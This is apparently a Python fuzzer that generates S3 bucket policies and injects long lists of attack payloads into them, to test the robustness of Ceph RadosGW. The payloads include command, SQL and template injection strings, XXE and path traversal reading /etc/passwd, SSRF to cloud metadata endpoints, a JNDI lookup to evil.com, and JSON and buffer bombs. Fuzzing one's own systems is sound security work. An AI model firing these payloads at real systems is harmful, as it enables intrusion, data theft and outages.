#!/usr/bin/env python3

import json
import os
import random
import sys
import hashlib
import pickle
import glob
from datetime import datetime

# Add templated-json-fuzzer directory to Python path
# This is in the same directory as this file (policy_handler/)
fuzzer_path = os.path.join(os.path.dirname(__file__), 'templated-json-fuzzer')
sys.path.insert(0, fuzzer_path)

# Import from jsonfuzzer package
# Note: The cloned repo needs __init__.py files in jsonfuzzer subdirectories
# Run this after cloning to add them:
#   touch templated-json-fuzzer/jsonfuzzer/{__init__.py,core/__init__.py,parser/__init__.py,util/__init__.py}
from jsonfuzzer.core.fuzzer import Fuzzer
from jsonfuzzer.parser.path_finder import PathFinder
from jsonfuzzer.util.util import Util


# Cache configuration
CACHE_DIR = "policy_cache"
CACHE_METADATA_FILE = "cache_metadata.json"


def get_cache_key(num_base_policies, include_aggressive):
    """Generate a cache key based on fuzzing parameters"""
    params = {
        'num_base_policies': num_base_policies,
        'include_aggressive': include_aggressive,
        'version': '1.0'  # Increment this when changing fuzzing logic
    }
    
    # Create hash of parameters
    params_str = json.dumps(params, sort_keys=True)
    return hashlib.md5(params_str.encode()).hexdigest()


def save_policies_to_cache(policies, cache_key, num_base_policies, include_aggressive):
    """Save generated policies to cache"""
    try:
        os.makedirs(CACHE_DIR, exist_ok=True)
        
        # Save policies
        cache_file = os.path.join(CACHE_DIR, f"policies_{cache_key}.pkl")
        with open(cache_file, 'wb') as f:
            pickle.dump(policies, f)
        
        # Update metadata
        metadata_file = os.path.join(CACHE_DIR, CACHE_METADATA_FILE)
        metadata = {}
        
        if os.path.exists(metadata_file):
            with open(metadata_file, 'r') as f:
                metadata = json.load(f)
        
        metadata[cache_key] = {
            'timestamp': datetime.now().isoformat(),
            'num_base_policies': num_base_policies,
            'include_aggressive': include_aggressive,
            'policy_count': len(policies),
            'file': f"policies_{cache_key}.pkl"
        }
        
        with open(metadata_file, 'w') as f:
            json.dump(metadata, f, indent=2)
        
        print(f"✅ Cached {len(policies)} policies with key: {cache_key}")
        return True
        
    except Exception as e:
        print(f"❌ Failed to cache policies: {e}")
        return False


def load_policies_from_cache(cache_key):
    """Load policies from cache"""
    try:
        cache_file = os.path.join(CACHE_DIR, f"policies_{cache_key}.pkl")
        
        if not os.path.exists(cache_file):
            return None
        
        with open(cache_file, 'rb') as f:
            policies = pickle.load(f)
        
        print(f"✅ Loaded {len(policies)} policies from cache: {cache_key}")
        return policies
        
    except Exception as e:
        print(f"❌ Failed to load from cache: {e}")
        return None


def list_cached_policies():
    """List all cached policy sets"""
    metadata_file = os.path.join(CACHE_DIR, CACHE_METADATA_FILE)
    
    if not os.path.exists(metadata_file):
        print("No cached policies found.")
        return {}
    
    try:
        with open(metadata_file, 'r') as f:
            metadata = json.load(f)
        
        print("=== Cached Policy Sets ===")
        for cache_key, info in metadata.items():
            timestamp = datetime.fromisoformat(info['timestamp']).strftime('%Y-%m-%d %H:%M:%S')
            aggressive = "YES" if info['include_aggressive'] else "NO"
            
            print(f"Key: {cache_key}")
            print(f"  Created: {timestamp}")
            print(f"  Base policies: {info['num_base_policies']}")
            print(f"  Aggressive mode: {aggressive}")
            print(f"  Total policies: {info['policy_count']}")
            print()
        
        return metadata
        
    except Exception as e:
        print(f"Error listing cache: {e}")
        return {}


def clear_cache():
    """Clear all cached policies"""
    try:
        if os.path.exists(CACHE_DIR):
            import shutil
            shutil.rmtree(CACHE_DIR)
            print("✅ Cache cleared successfully")
        else:
            print("Cache directory doesn't exist")
    except Exception as e:
        print(f"❌ Failed to clear cache: {e}")


def get_cache_stats():
    """Get cache statistics"""
    if not os.path.exists(CACHE_DIR):
        return {"total_sets": 0, "total_policies": 0, "disk_usage": 0}
    
    try:
        metadata_file = os.path.join(CACHE_DIR, CACHE_METADATA_FILE)
        if not os.path.exists(metadata_file):
            return {"total_sets": 0, "total_policies": 0, "disk_usage": 0}
        
        with open(metadata_file, 'r') as f:
            metadata = json.load(f)
        
        total_policies = sum(info['policy_count'] for info in metadata.values())
        
        # Calculate disk usage
        disk_usage = 0
        for root, dirs, files in os.walk(CACHE_DIR):
            for file in files:
                disk_usage += os.path.getsize(os.path.join(root, file))
        
        return {
            "total_sets": len(metadata),
            "total_policies": total_policies,
            "disk_usage": disk_usage
        }
        
    except Exception as e:
        print(f"Error getting cache stats: {e}")
        return {"total_sets": 0, "total_policies": 0, "disk_usage": 0}


def generate_statement():
    """Generate a single S3 policy statement with random values"""
    bucket_name = f"test-bucket-{random.randint(1000, 9999)}"
    account_id = random.randint(100000000000, 999999999999)
    
    s3_actions = ["s3:GetObject", "s3:PutObject", "s3:DeleteObject", "s3:ListBucket", 
                  "s3:GetObjectAcl", "s3:PutObjectAcl", "s3:GetBucketLocation", "s3:ListAllMyBuckets"]
    
    # Generate 1-3 random actions for this statement
    num_actions = random.randint(1, 3)
    actions = random.sample(s3_actions, num_actions)
    
    statement = {
        "Sid": f"Statement{random.randint(1, 1000)}",
        "Effect": random.choice(["Allow", "Deny"]),
        "Principal": random.choice([
            {"AWS": f"arn:aws:iam::{account_id}:user/TestUser{random.randint(1, 50)}"},
            {"Service": random.choice(["s3.amazonaws.com", "cloudtrail.amazonaws.com", "lambda.amazonaws.com"])},
            {"AWS": f"arn:aws:iam::{account_id}:role/TestRole{random.randint(1, 20)}"},
            "*"
        ]),
        "Action": actions if len(actions) > 1 else actions[0],
        "Resource": random.choice([
            f"arn:aws:s3:::{bucket_name}",
            f"arn:aws:s3:::{bucket_name}/*",
            [f"arn:aws:s3:::{bucket_name}", f"arn:aws:s3:::{bucket_name}/*"]
        ])
    }
    
    # Randomly add conditions (50% chance)
    if random.random() < 0.5:
        condition_operator = random.choice(["StringEquals", "StringNotEquals", "Bool", "DateGreaterThan"])
        condition_key = random.choice(["aws:SecureTransport", "s3:ExistingObjectTag/Environment", 
                                     "aws:MultiFactorAuthAge", "aws:PrincipalOrgID"])
        condition_value = random.choice(["true", "false", "Production", "3600", "o-example123456"])
        
        statement["Condition"] = {
            condition_operator: {
                condition_key: condition_value
            }
        }
    
    return statement


def generate_s3_policy_template():
    """Generate a complete S3 policy with 1-5 statements"""
    num_statements = random.randint(1, 5)
    
    policy = {
        "Version": "2012-10-17",
        "Id": f"S3PolicyId-{random.randint(1000, 9999)}",
        "Statement": []
    }
    
    for _ in range(num_statements):
        policy["Statement"].append(generate_statement())
    
    return policy


def get_aggressive_fuzz_payloads():
    """Generate more aggressive and targeted malicious payloads"""
    aggressive_payloads = []
    
    # Generate various buffer overflow attempts
    for size in [1000, 5000, 10000, 50000, 100000]:
        aggressive_payloads.extend([
            "A" * size,
            "0" * size,
            "\x00" * size,
            "\xff" * size,
            "\\x41" * size,
        ])
    
    # Generate format string attacks
    for count in [10, 50, 100, 500]:
        aggressive_payloads.extend([
            "%s" * count,
            "%x" * count,
            "%n" * count,
            "%p" * count,
        ])
    
    # Generate nested JSON bombs
    for depth in [100, 500, 1000]:
        nested = "{"
        for i in range(depth):
            nested += f'"level{i}": {{'
        nested += '"bomb": "payload"'
        nested += "}" * (depth + 1)
        aggressive_payloads.append(nested)
    
    # Generate array bombs
    for size in [1000, 5000, 10000]:
        aggressive_payloads.append("[" + "null," * size + "null]")
    
    # Generate string repetition attacks
    base_strings = [
        "../",
        "%2e%2e%2f",
        "\\",
        "'",
        '"',
        ";",
        "|",
        "&",
        "$",
        "`",
        "(",
        ")",
        "{",
        "}",
        "[",
        "]",
    ]
    
    for base in base_strings:
        for count in [100, 500, 1000]:
            aggressive_payloads.append(base * count)
    
    # Generate Unicode attacks
    unicode_chars = [
        "\u0000",  # NULL
        "\u000A",  # Line feed
        "\u000D",  # Carriage return
        "\u0020",  # Space
        "\u00A0",  # Non-breaking space
        "\u2028",  # Line separator
        "\u2029",  # Paragraph separator
        "\uFEFF",  # Byte order mark
        "\uFFFE",  # Reversed BOM
        "\uFFFF",  # Invalid character
    ]
    
    for char in unicode_chars:
        for count in [100, 1000]:
            aggressive_payloads.append(char * count)
    
    # Generate mixed payload attacks
    mixed_attacks = [
        "admin'/**/OR/**/1=1--",
        "'; EXEC xp_cmdshell('dir'); --",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "${jndi:ldap://evil.com:1389/a}",
        "../../../../proc/self/environ%00",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
    ]
    aggressive_payloads.extend(mixed_attacks)
    
    return aggressive_payloads


def get_all_fuzz_payloads(include_aggressive=False):
    """Get all fuzz payloads, optionally including aggressive ones"""
    payloads = get_fuzz_payloads()
    
    if include_aggressive:
        payloads.extend(get_aggressive_fuzz_payloads())
    
    return payloads


def get_fuzz_payloads():
    """Generate various fuzzing payloads for different attack vectors"""
    return [
        # Basic injection payloads
        "FUZZ_PAYLOAD",
        "",
        None,
        
        # S3-specific malicious payloads
        "../../../etc/passwd",
        "arn:aws:s3:::*",
        "arn:aws:s3:::../malicious-bucket/*",
        
        # JSON injection
        '{"malicious": "payload"}',
        '["array", "injection"]',
        
        # Large values to cause buffer overflows
        "A" * 10000,
        "B" * 100000,
        "X" * 1000000,
        
        # Special AWS characters
        "arn:aws:iam::*:*",
        "bucket-with-$pecial-char$",
        
        # Boolean/Number confusion
        True,
        False,
        999999999999999999,
        -1,
        
        # AWS policy bypass attempts  
        "*",
        "s3:*Object*",
        "arn:aws:iam::123456789012:root",
        
        # # === NEW MALICIOUS PAYLOADS FOR RGW BREAKING ===
        
        # Path traversal attacks
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        
        # Command injection attempts
        "; cat /etc/passwd",
        "| whoami",
        "& ls -la",
        "`id`",
        "$(uname -a)",
        "${IFS}cat${IFS}/etc/passwd",
        
        # SQL injection patterns
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "1' UNION SELECT NULL--",
        "admin'--",
        "' OR 1=1#",
        
        # XML/XXE injection
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///dev/random'>]>",
        
        # LDAP injection
        "*)(uid=*",
        "admin)(&(password=*)",
        "*))%00",
        
        # NoSQL injection
        "{'$ne': null}",
        "{'$gt': ''}",
        "{'$regex': '.*'}",
        
        # Script injection
        "<script>alert('XSS')</script>",
        "javascript:alert(1)",
        "<img src=x onerror=alert(1)>",
        
        # Format string attacks
        "%s%s%s%s%s",
        "%x%x%x%x%x",
        "%n%n%n%n%n",
        
        # Memory corruption attempts
        "\x00" * 1000,
        "\xff" * 5000,
        "\x41" * 10000 + "\x42\x43\x44\x45",
        
        # Unicode and encoding bypasses
        "test\u0000.txt",
        "test\uFEFF.txt",
        "test\u202E.txt",
        "%c0%ae%c0%ae/",
        "%252e%252e%252f",
        
        # Binary data
        b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f",
        b"\x90" * 100,  # NOP sled
        b"\xde\xad\xbe\xef",
        
        # Protocol confusion
        "http://evil.com/",
        "ftp://malicious.com/",
        "file:///etc/passwd",
        "data:text/html,<script>alert(1)</script>",
        
        # Integer overflow attempts
        18446744073709551615,  # Max uint64
        -9223372036854775808,  # Min int64
        2147483647,           # Max int32
        -2147483648,          # Min int32
        
        # Float point attacks
        float('inf'),
        float('-inf'),
        float('nan'),
        1.7976931348623157e+308,  # Close to max float64
        
        # Control characters
        "\r\n\r\nHTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n",
        "\x1b[2J\x1b[H",  # ANSI escape codes
        "\x07" * 100,    # Bell characters
        
        # JSON bombs
        '{"a":' * 10000 + '"value"' + '}' * 10000,
        '[' * 10000 + '1' + ']' * 10000,
        
        # Regex DoS (ReDoS)
        "a" * 10000 + "X",
        "(a+)+b",
        "a" * 50 + "!" * 50,
        
        # Time-based attacks
        "sleep(10)",
        "WAITFOR DELAY '00:00:10'",
        "pg_sleep(10)",
        
        # DNS/Network attacks
        "evil.burpcollaborator.net",
        "pingme.example.com",
        "127.0.0.1:22",
        "localhost:3306",
        
        # File system attacks
        "/proc/self/environ",
        "/proc/version",
        "/proc/meminfo",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        
        # AWS/S3 specific attacks
        "arn:aws:s3:::*/*",
        "arn:aws:iam::*:root",
        "arn:aws:sts::*:assumed-role/*",
        "*@*.amazonaws.com",
        
        # SSRF attempts
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "http://127.0.0.1:8080/",
        "gopher://127.0.0.1:6379/_",
        
        # Deserialization attacks
        'O:8:"stdClass":0:{}',
        'rO0ABXNyABNqYXZhLnV0aWwuSGFzaHRhYmxl',
        
        # Template injection
        "{{7*7}}",
        "${7*7}",
        "<%=7*7%>",
        "#{7*7}",
        
        # Log injection
        "\n[ERROR] Fake log entry\n",
        "\r\n\r\n[CRITICAL] System compromised\r\n",
        
        # Race condition payloads
        *["RACE_CONDITION_TEST" + str(i) for i in range(100)],
        
        # === RGW/CEPH SPECIFIC ATTACKS ===
        
        # Ceph RadosGW specific paths
        "admin/bucket",
        "admin/user",
        "admin/usage",
        "admin/info",
        "admin/caps",
        
        # Ceph object store attacks
        ".rgw",
        ".log",
        ".intent-log",
        ".usage",
        ".users",
        ".users.email",
        ".users.keys",
        ".users.swift",
        
        # RadosGW internal buckets
        ".rgw.root",
        ".rgw.control", 
        ".rgw.gc",
        ".rgw.buckets",
        ".rgw.buckets.index",
        ".rgw.buckets.extra",
        
        # Ceph pool manipulation attempts
        "rbd",
        "cephfs_data", 
        "cephfs_metadata",
        ".rgw.log",
        
        # RadosGW configuration bypasses
        "rgw_enable_usage_log=true",
        "rgw_usage_max_user_shards=0",
        "debug_rgw=20",
        
        # Multi-part upload attacks
        "?uploads",
        "?uploadId=malicious",
        "?partNumber=999999",
        "?max-parts=0",
        
        # Bucket lifecycle attacks
        "?lifecycle",
        "?notification",
        "?inventory",
        "?metrics",
        "?analytics",
        "?website",
        
        # ACL manipulation
        "?acl",
        "?policy", 
        "?cors",
        "?encryption",
        "?requestPayment",
        "?torrent",
        
        # RadosGW Swift API attacks
        "?format=json&marker=" + "A" * 10000,
        "?format=xml&limit=999999999",
        "?temp_url_sig=malicious",
        "?temp_url_expires=0",
        
        # Object versioning attacks
        "?versioning",
        "?versions",
        "?versionId=" + "x" * 1000,
        "?delete",
        
        # Multitenancy attacks
        "tenant$bucket",
        "$tenant$",
        ":" + "A" * 1000,
        
        # RadosGW metadata injection
        "x-amz-meta-" + "A" * 10000,
        "x-rgw-" + "B" * 5000,
        "x-container-meta-" + "C" * 5000,
        
        # Storage class attacks
        "?storageClass=INVALID",
        "?storageClass=" + "X" * 1000,
        
        # Compression/encryption bypass
        "?compression=none",
        "?encryption=none", 
        "?sse=disabled",
        
        # RadosGW Admin API specific
        "?format=json&stats=true&uid=" + "admin" * 1000,
        "?quota&quota-type=user&uid=*",
        "?key&access-key=" + "A" * 100,
        "?caps&caps=*",
        
        # RADOS object attacks
        "__shadow_" + "x" * 1000,
        "_multipart_" + "y" * 1000,
        ".dir." + "z" * 1000,
    ]


def replace_template_variables(template_json, replacements):
    """Replace template variables with realistic values"""
    json_str = json.dumps(template_json)
    
    for placeholder, value in replacements.items():
        json_str = json_str.replace(placeholder, str(value))
    
    return json.loads(json_str)


def load_s3_template():
    """Load the S3 bucket policy template"""
    template_path = "s3-bucket-policy-template.json"
    
    if not os.path.exists(template_path):
        raise FileNotFoundError(f"S3 template not found at {template_path}")
    
    with open(template_path, 'r') as f:
        return json.load(f)


def generate_fuzzing_variants(base_structure, payloads):
    """Generate fuzzing variants using multiple payloads"""
    path_finder = PathFinder()
    fuzzer = Fuzzer()
    
    parameter_paths = path_finder.map_structure(structure=base_structure)
    all_variants = []
    
    for payload in payloads:
        try:
            # Parameter payload permutations
            parameter_variants = fuzzer.generate_structure_parameter_permutations_for_payload(
                structure=base_structure,
                paramater_paths=parameter_paths,
                value_to_inject=payload,
            )
            all_variants.extend(parameter_variants)
            
            # Structure payload permutations
            structure_variants = fuzzer.generate_structure_permutations_for_payload(
                structure=base_structure,
                paramater_paths=parameter_paths,
                value_to_inject=payload,
            )
            all_variants.extend(structure_variants)
        except Exception as e:
            # Skip payloads that cause errors in the fuzzer itself
            print(f"Skipping problematic payload: {str(e)[:100]}")
            continue
    
    # Missing attribute permutations (only once, not per payload)
    try:
        missing_variants = fuzzer.generate_structure_missing_attribute_permutations(
            structure=base_structure,
            paramater_paths=parameter_paths
        )
        all_variants.extend(missing_variants)
    except Exception as e:
        print(f"Error generating missing attribute variants: {e}")
    
    # Remove duplicates
    unique_variants = []
    for variant in all_variants:
        if variant not in unique_variants:
            unique_variants.append(variant)
    
    return unique_variants


def save_fuzzing_results(results, output_dir="s3_fuzz_results", clear_existing=True):
    """Save fuzzing results to files"""
    import shutil
    
    if clear_existing and os.path.exists(output_dir):
        print(f"🗑️  Clearing existing directory: {output_dir}")
        shutil.rmtree(output_dir)
        print(f"📁 Creating fresh directory: {output_dir}")
    elif not clear_existing and os.path.exists(output_dir):
        print(f"� Appending to existing directory: {output_dir}")
    else:
        print(f"📁 Creating new directory: {output_dir}")
    
    # Create directory
    os.makedirs(output_dir, exist_ok=True)
    
    # Get starting index if appending
    start_index = 0
    if not clear_existing and os.path.exists(output_dir):
        existing_files = [f for f in os.listdir(output_dir) if f.startswith("fuzzed_policy_") and f.endswith(".json")]
        if existing_files:
            # Find the highest numbered file
            numbers = []
            for f in existing_files:
                try:
                    num = int(f.replace("fuzzed_policy_", "").replace(".json", ""))
                    numbers.append(num)
                except ValueError:
                    continue
            if numbers:
                start_index = max(numbers) + 1
    
    saved_count = 0
    for i, result in enumerate(results):
        try:
            filename = os.path.join(output_dir, f"fuzzed_policy_{start_index + i:04d}.json")
            with open(filename, 'w') as f:
                json.dump(result, f, indent=2, default=str)  # Convert non-serializable objects to strings
            saved_count += 1
        except Exception as e:
            print(f"Skipping policy {i} due to serialization error: {str(e)[:100]}")
            continue
    
    print(f"✅ Saved {saved_count}/{len(results)} fuzzed policies to {output_dir}/")


def generate_fuzzed_policies(num_base_policies=5, include_aggressive=False, use_cache=True, force_regenerate=False):
    """Generate multiple fuzzed S3 policies and return them as a list"""
    
    # Generate cache key
    cache_key = get_cache_key(num_base_policies, include_aggressive)
    
    # Try to load from cache first (unless forced to regenerate)
    if use_cache and not force_regenerate:
        cached_policies = load_policies_from_cache(cache_key)
        if cached_policies is not None:
            return cached_policies
    
    # Generate new policies
    print("🔄 Generating new fuzzed policies...")
    all_fuzzed_policies = []
    
    try:
        fuzz_payloads = get_all_fuzz_payloads(include_aggressive=include_aggressive)
        print(f"Using {len(fuzz_payloads)} payloads (aggressive: {include_aggressive})")
        
        # Generate multiple base policies for more variety
        for i in range(num_base_policies):
            print(f"Processing base policy {i+1}/{num_base_policies}...")
            s3_structure = generate_s3_policy_template()
            variants = generate_fuzzing_variants(s3_structure, fuzz_payloads)
            all_fuzzed_policies.extend(variants)
        
        # Remove duplicates
        unique_policies = []
        for policy in all_fuzzed_policies:
            if policy not in unique_policies:
                unique_policies.append(policy)
        
        print(f"Generated {len(unique_policies)} unique fuzzed policies")
        
        # Save to cache
        if use_cache:
            save_policies_to_cache(unique_policies, cache_key, num_base_policies, include_aggressive)
        
        return unique_policies
        
    except Exception as e:
        print(f"Error generating fuzzed policies: {e}")
        return []


def get_random_fuzzed_policy(include_aggressive=False, use_cache=True):
    """Get a single random fuzzed policy"""
    policies = generate_fuzzed_policies(num_base_policies=1, include_aggressive=include_aggressive, use_cache=use_cache)
    return policies[0] if policies else generate_s3_policy_template()


def get_policy_json_string(policy_dict):
    """Convert policy dictionary to JSON string"""
    try:
        return json.dumps(policy_dict, separators=(',', ':'), default=str)
    except Exception as e:
        print(f"Error converting policy to JSON: {e}")
        return json.dumps(generate_s3_policy_template(), separators=(',', ':'))


# ============================================================================
# Helper Functions for s3_proxy_fuzz.py Integration
# ============================================================================

def load_policies_from_directory(policy_dir):
    """
    Load pre-generated fuzzed policies from files.
    This is used by s3_proxy_fuzz.py to load policies from disk.
    
    Args:
        policy_dir: Directory containing fuzzed policy JSON files
        
    Returns:
        List of policy dictionaries
    """
    policies = []
    
    if not os.path.exists(policy_dir):
        print(f"❌ Policy directory not found: {policy_dir}")
        return []
    
    # Find all policy files
    policy_files = glob.glob(os.path.join(policy_dir, "fuzzed_policy_*.json"))
    
    if not policy_files:
        print(f"❌ No policy files found in {policy_dir}")
        return []
    
    print(f"📂 Loading policies from: {policy_dir}")
    print(f"🔍 Found {len(policy_files)} policy files")
    
    # Load policies from files
    loaded_count = 0
    for policy_file in policy_files:
        try:
            with open(policy_file, 'r') as f:
                policy = json.load(f)
                policies.append(policy)
                loaded_count += 1
        except Exception as e:
            print(f"⚠️  Failed to load {policy_file}: {e}")
            continue
    
    print(f"✅ Successfully loaded {loaded_count} fuzzed policies")
    
    return policies


def get_random_policy_from_list(policies, bucket_name=None):
    """
    Get a random fuzzed policy from a list, optionally customized for bucket.
    This is used by s3_proxy_fuzz.py to select a random policy.
    
    Args:
        policies: List of policy dictionaries to choose from
        bucket_name: Optional bucket name to customize the policy
        
    Returns:
        Policy dictionary (random selection from list or fallback)
    """
    if not policies:
        # Fallback to basic policy if no fuzzed policies available
        return {
            "Version": "2012-10-17",
            "Statement": [{
                "Effect": "Allow",
                "Principal": {"AWS": "*"},
                "Action": "s3:ListBucket",
                "Resource": [f"arn:aws:s3:::{bucket_name or 'fallback-bucket'}"]
            }]
        }
    
    # Get random policy (deep copy to avoid modifying the original)
    import copy
    policy = copy.deepcopy(random.choice(policies))
    
    # Try to customize for specific bucket if provided
    if bucket_name:
        try:
            policy_str = json.dumps(policy)
            # Replace test bucket names with actual bucket name
            customized_str = policy_str.replace("test-bucket-", f"{bucket_name}-")
            policy = json.loads(customized_str)
        except:
            pass  # Use original policy if customization fails
    
    return policy


def check_policy_directories_status():
    """
    Check status of policy directories (normal and aggressive).
    This is used by s3_proxy_fuzz.py to show available policies.
    
    Returns:
        Dictionary with status information
    """
    normal_dir = "s3_fuzz_results"
    aggressive_dir = "s3_fuzz_results_aggressive"
    
    status = {
        "normal": {"exists": False, "count": 0, "size_mb": 0},
        "aggressive": {"exists": False, "count": 0, "size_mb": 0}
    }
    
    for dir_name, mode in [(normal_dir, "normal"), (aggressive_dir, "aggressive")]:
        if os.path.exists(dir_name):
            policy_files = glob.glob(os.path.join(dir_name, "fuzzed_policy_*.json"))
            total_size = sum(os.path.getsize(os.path.join(dir_name, f)) 
                           for f in os.listdir(dir_name) if f.endswith('.json'))
            
            status[mode] = {
                "exists": True,
                "count": len(policy_files),
                "size_mb": total_size / 1024 / 1024,
                "directory": dir_name
            }
    
    return status


def print_policy_directories_status():
    """
    Print the status of policy directories in a formatted way.
    This is used by s3_proxy_fuzz.py --status command.
    """
    print("📋 Policy Directory Status:")
    
    status = check_policy_directories_status()
    
    for mode, info in status.items():
        mode_label = mode.upper()
        if info["exists"]:
            print(f"  {mode_label}: ✅ {info['count']} policies ({info['size_mb']:.1f} MB)")
        else:
            print(f"  {mode_label}: ❌ Directory not found")
            if mode == "aggressive":
                print(f"    Run: python3 fuzz_s3_policy.py --aggressive --policies 5")
            else:
                print(f"    Run: python3 fuzz_s3_policy.py --policies 5")


# ============================================================================
# End of Helper Functions
# ============================================================================


def main():
    """Main fuzzing function for S3 bucket policies"""
    
    import argparse
    parser = argparse.ArgumentParser(description='S3 Policy Fuzzer with Caching')
    parser.add_argument('--aggressive', action='store_true', 
                       help='Include aggressive payloads designed to break RGW')
    parser.add_argument('--policies', type=int, default=5,
                       help='Number of base policies to generate (default: 5)')
    parser.add_argument('--no-cache', action='store_true',
                       help='Disable caching (always generate new policies)')
    parser.add_argument('--force-regenerate', action='store_true',
                       help='Force regeneration even if cache exists')
    parser.add_argument('--list-cache', action='store_true',
                       help='List all cached policy sets')
    parser.add_argument('--clear-cache', action='store_true',
                       help='Clear all cached policies')
    parser.add_argument('--cache-stats', action='store_true',
                       help='Show cache statistics')
    parser.add_argument('--append-results', action='store_true',
                       help='Append to existing results instead of clearing directory')
    
    args = parser.parse_args()
    
    # Handle cache operations
    if args.list_cache:
        list_cached_policies()
        return
    
    if args.clear_cache:
        clear_cache()
        return
    
    if args.cache_stats:
        stats = get_cache_stats()
        print("=== Cache Statistics ===")
        print(f"Cached policy sets: {stats['total_sets']}")
        print(f"Total policies: {stats['total_policies']}")
        print(f"Disk usage: {stats['disk_usage'] / 1024 / 1024:.2f} MB")
        return
    
    try:
        print("=== S3 Policy Fuzzer ===")
        print(f"Aggressive mode: {'ENABLED' if args.aggressive else 'DISABLED'}")
        print(f"Base policies: {args.policies}")
        print(f"Caching: {'DISABLED' if args.no_cache else 'ENABLED'}")
        if args.force_regenerate:
            print("🔄 Force regenerate: ENABLED")
        print()
        
        # Check cache first
        use_cache = not args.no_cache
        cache_key = get_cache_key(args.policies, args.aggressive)
        
        if use_cache and not args.force_regenerate:
            print(f"Cache key: {cache_key}")
        
        print("Generating fuzzed S3 policies...")
        all_variants = generate_fuzzed_policies(
            num_base_policies=args.policies, 
            include_aggressive=args.aggressive,
            use_cache=use_cache,
            force_regenerate=args.force_regenerate
        )
        
        # Save to files for reference
        output_dir = "s3_fuzz_results_aggressive" if args.aggressive else "s3_fuzz_results"
        clear_existing = not args.append_results
        save_fuzzing_results(all_variants, output_dir, clear_existing=clear_existing)
        
        # Print a sample policy
        if all_variants:
            print("\nSample fuzzed policy:")
            try:
                print(json.dumps(all_variants[0], indent=2, default=str))
            except Exception as e:
                print(f"Error displaying sample policy: {e}")
                print("Sample policy structure:", type(all_variants[0]))
            
            if args.aggressive:
                print("\n⚠️  Warning: Aggressive payloads included!")
                print("These may cause crashes, hangs, or other issues in RGW")
            
            # Show cache info
            if use_cache:
                print(f"\n💾 Cache key: {cache_key}")
                print("Use --list-cache to see all cached sets")
        
    except Exception as e:
        print(f"Unexpected error: {e}")


if __name__ == "__main__":
    main()
